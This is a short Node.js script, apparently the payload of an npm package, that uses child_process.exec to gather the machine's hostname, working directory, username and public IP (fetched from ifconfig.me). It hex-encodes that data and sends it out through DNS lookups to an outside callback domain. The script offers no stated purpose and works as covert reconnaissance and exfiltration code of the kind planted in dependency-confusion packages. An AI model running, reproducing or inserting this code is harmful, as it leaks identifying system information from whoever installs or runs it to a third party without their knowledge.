const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});

